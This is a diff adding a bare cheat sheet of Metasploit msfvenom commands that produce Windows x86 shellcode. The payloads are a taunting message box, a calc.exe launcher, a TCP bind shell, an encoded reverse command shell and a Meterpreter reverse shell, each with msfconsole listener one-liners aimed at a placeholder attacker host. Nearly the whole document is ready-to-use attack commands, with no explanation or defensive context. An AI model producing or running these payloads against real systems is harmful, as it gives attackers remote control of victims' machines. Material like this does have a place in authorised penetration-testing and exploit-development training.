@@ -1,0 +1,47 @@
+Create Shell code on Kali Linux
+
+###########################################################################################
+
+Message Box
+
+msfvenom -p windows/messagebox TEXT="You been PWND by XFR" -f c -a x86 -b "\x00\x09\x20"
+
+###########################################################################################
+
+Calculator
+
+msfvenom -p windows/exec CMD="C:\windows\system32\calc.exe" -f c -a x86 -b "\x00\x09\x0F\x20"
+
+###########################################################################################
+
+Listener that can be connected to via NetCat on TCP Port 4444
+
+msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x20"
+
+###########################################################################################
+
+Reverse Shell (Command Prompt)
+msfvenom -p windows/shell/reverse_tcp LHOST=<ip of metasploit> LPORT=443 EXITFUNC=process -e x86/shikata_ga_nai -f c -b '\x00\x0a\x0d\x20'
+
+Create Listener in Metasploit
+sudo msfconsole -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ip of metasploit listener>; set LPORT 443; set EXITFUNC process; run"
+
+###########################################################################################
+
+Reverse Shell (meterpreter)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip of metasploit> LPORT=443 -f c -a x86
+
+Create Listener in Metasploit
+sudo msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <ip of metasploit listener; set LPORT 443; set EXITFUNC process; run"
+
+
+
+
+
+
+
+
+
+
+
+
